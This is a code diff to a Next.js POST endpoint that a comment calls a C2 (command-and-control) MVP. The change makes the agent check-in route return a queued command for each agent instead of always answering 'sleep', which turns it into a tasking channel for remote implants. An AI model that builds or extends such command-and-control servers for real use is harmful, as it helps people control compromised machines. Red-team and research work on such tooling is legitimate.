@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { saveAgent, AgentData } from '../db';
+import { saveAgent, popCommand, AgentData } from '../db';
 
 export async function POST(request: Request) {
     try {
@@ -17,9 +17,11 @@ export async function POST(request: Request) {
 
         saveAgent(cleanData);
 
-        // In a real C2, this response would contain a JSON payload of commands to execute
-        // For our MVP, we just acknowledge receipt
-        return NextResponse.json({ status: 'ok', command: 'sleep' }, { status: 200 });
+        // Check if there is a pending command for this specific agent
+        const pendingCmd = popCommand(data.id);
+        const commandToSend = pendingCmd ? pendingCmd : 'sleep';
+
+        return NextResponse.json({ status: 'ok', command: commandToSend }, { status: 200 });
     } catch (error) {
         return NextResponse.json({ error: 'Invalid payload' }, { status: 400 });
     }
